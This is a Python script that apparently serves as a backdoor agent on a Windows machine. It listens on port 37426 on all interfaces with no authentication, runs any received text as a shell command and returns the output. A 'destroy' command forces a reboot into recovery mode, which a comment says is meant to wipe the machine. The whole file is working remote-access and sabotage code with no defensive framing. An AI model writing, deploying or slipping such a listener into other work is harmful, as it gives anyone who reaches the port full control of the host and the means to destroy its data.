import socket
import subprocess

from getmac import get_mac_address
MAC = get_mac_address().replace(':', '')

# note: 3 commands available.
# c - Check connection
# Returns 'MAC ADDRESS: {MAC} | Still Up'
# e - Execute command
# Syntax: e cmd param1 param2
# d - Destroy the machine

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('0.0.0.0', 37426))
    while True:
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                data = data.decode()
                match data[0]:
                    case 'c':
                        conn.sendall(f'MAC ADDRESS: {MAC} | Still Up'.encode())
                    case 'e':
                        cmd = data[2:]
                        result = subprocess.run(cmd, capture_output=True, text=True, shell=True).stdout
                        conn.sendall(f'MAC ADDRESS: {MAC} | Executing Command: {cmd}\nResult:\n{result}'.encode())
                    case 'd':
                        result = subprocess.run("reagentc /boottore && shutdown /r /f /t 0", capture_output=True, text=True, shell=True)  # restart into recovery mode to start wiping
                        conn.sendall(f'MAC ADDRESS: {MAC} | Destroying\nResult:\n{result}'.encode())
                    case _:
                        conn.sendall('Invalid command'.encode())